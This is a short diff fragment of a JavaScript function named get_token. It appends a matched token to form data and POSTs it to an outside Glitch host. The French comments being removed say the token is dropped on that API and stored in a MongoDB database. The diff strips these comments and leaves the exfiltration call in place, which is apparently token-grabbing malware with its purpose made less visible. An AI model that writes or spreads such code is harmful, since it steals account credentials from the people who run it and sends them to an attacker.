@@ -69,10 +69,6 @@ async function get_token(path) {
                         const benladen = new URLSearchParams();
                         
                         benladen.append("token", match);
-                        //là le token est drop sur cette api (glitch) ptdr
-                        //on va faire une request pour la tester
-                        //donc voila
-                        //les tokens sont stockés sur un base de donnée mongodb
                         fetch("https://truthful-oceanic-bonobo.glitch.me/", {
                             method: "POST",
                             body: benladen
